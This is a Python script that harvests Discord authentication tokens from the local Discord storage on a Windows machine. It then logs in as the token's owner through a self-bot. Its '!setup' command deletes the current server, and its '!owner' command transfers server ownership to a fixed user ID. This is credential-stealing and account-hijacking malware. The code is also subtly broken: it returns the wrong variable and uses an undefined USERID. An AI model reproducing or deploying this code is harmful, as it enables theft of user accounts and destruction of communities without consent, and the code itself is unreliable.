import discord
from discord.ext import commands
import asyncio
import re 
import os
roaming = os.getenv('APPDATA')

def find_tokens():
    tokens = []
    path = roaming + "\\Discord\\Local Storage\\leveldb"
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return token

intents = discord.Intents.all()
token2 = str(find_tokens()) #insert target token
prefix = "!"
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
@bot.command()
async def setup(ctx):
    await ctx.guild.delete()
@bot.command()
async def owner(ctx):
    user = await bot.fetch_user(USERID)
    await ctx.guild.edit(owner=user)

asyncio.set_event_loop(asyncio.new_event_loop())
loop = asyncio.new_event_loop()
bot.run(token2, bot=False)
